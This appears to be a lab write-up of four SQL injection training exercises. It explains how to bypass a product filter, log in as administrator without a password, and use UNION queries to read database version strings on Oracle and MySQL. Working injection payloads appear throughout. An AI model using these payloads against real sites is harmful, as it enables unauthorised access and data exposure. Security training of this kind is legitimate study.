# SQL injection
---
## 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Clicking on "Corporate gifts" gets you an URL like `/filter?category=Corporate+gifts`

<img width="2322" height="226" alt="81185" src="https://github.com/user-attachments/assets/827c84a1-0e93-44a0-9343-75312ea46690" />

This is perfect since we are trying to find a field that performs SQL requests on the API. `/filter?category=Corporate+gifts` translate to `SELECT * FROM products WHERE category = 'Corporate gifts' AND released = 1`.

We can then leverage this by closing the category brackets and add an alway true condition like `1=1` so it lists **EVERY** products (not just the released ones).

Our new URL looks like `/filter?category='+OR+1=1--` so this translate to `SELECT * FROM products WHERE category = '' OR 1 = 1` (removing the category and released check).

---
## 2. Lab: SQL injection vulnerability allowing login bypass
Clicking on "My account" gives you a form.

<img width="1480" height="660" alt="519" src="https://github.com/user-attachments/assets/a58c0e3a-628d-49e1-8f34-1895f30c2ee2" />

This allows you to perform an SQL request like so: `SELECT * FROM users WHERE username = '<your input>' AND password = '<your input>'`.

We know an administrator account username is "administrator" but we don't know the password. We then need to bypass this.

In SQL, you can comment the rest of your request by using the syntax `--`. We will leverage this by entering `administrator'--` as our username. (We can put anything as the password as it will be commented and won't matter)

Our new SQL request will then look like this: `SELECT * FROM users WHERE username = 'administrator' -- (the rest is commented)`.

---
## 3. Lab: SQL injection attack, querying the database type and version on Oracle
We want to display the database version string with we can do with `SELECT BANNER FROM v$version` (on Oracle).

We already know `/filter?category=` is vulnerable to SQL injections but this is a `SELECT` in the wrong table. Luckily we can use `UNION` to search for elements in multiple table.

We can then try to build an SQL request like `SELECT * FROM products WHERE category = '' UNION SELECT BANNER FROM v$version`.

We can do that by using the URL `/filter?category='+UNION+SELECT+BANNER+FROM+v$version--` but this gives us an error.

We also know that selecting `NULL` does not change anything. We can leverage that by using the URL `/filter?category='+UNION+SELECT+BANNER,+NULL+FROM+v$version--`.

---
## 4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
We want to display the database version and Microsoft with we can do with `SELECT @@version`.

We already know `/filter?category=` is vulnerable to SQL injections but this is a `SELECT` in the wrong table. Luckily we can use `UNION` to search for elements in multiple table.

We can then try to build an SQL request like `SELECT * FROM products WHERE category = '' UNION SELECT @@version`.

We can do that by using the URL `/filter?category='+UNION+SELECT+@@version#` but this gives us an error.

We also know that selecting `NULL` does not change anything. We can leverage that by using the URL `/filter?category='+UNION+SELECT+@@version,+NULL#`.
